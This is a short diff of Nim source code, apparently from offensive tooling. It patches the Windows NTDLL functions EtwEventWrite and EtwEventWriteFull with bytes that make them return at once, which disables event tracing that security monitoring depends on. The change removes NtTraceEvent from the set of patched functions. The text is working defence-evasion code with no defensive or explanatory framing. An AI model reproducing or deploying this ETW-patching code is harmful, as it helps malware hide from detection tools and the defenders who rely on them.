@@ -7,7 +7,6 @@ var patchByteArray: array[3, byte] = [byte 0x33, 0xC0, 0xC3]
 
 var EEW = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite")
 var EEWF = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWriteFull")
-var NTTE = GetProcAddress(GetModuleHandleA("NTDLL"),"NtTraceEvent")
 
 proc PatchEtwFunction*(fnAddr: PVOID): BOOL =
     var oldProtection: DWORD
@@ -24,9 +23,8 @@ proc PatchEtwFunction*(fnAddr: PVOID): BOOL =
 proc PatchAllEtwFunctions*() =
     echo("EEW: " & cast[PVOID](EEW).repr())
     echo("EEWF: " & cast[PVOID](EEWF).repr())
-    echo("NTTE: " & cast[PVOID](NTTE).repr())
 
-    if PatchEtwFunction(EEW) and PatchEtwFunction(EEWF) and PatchEtwFunction(NTTE):
+    if PatchEtwFunction(EEW) and PatchEtwFunction(EEWF):
         echo("Patched All Etw Functions")
     else:
         echo("Failed To Etw Functions")
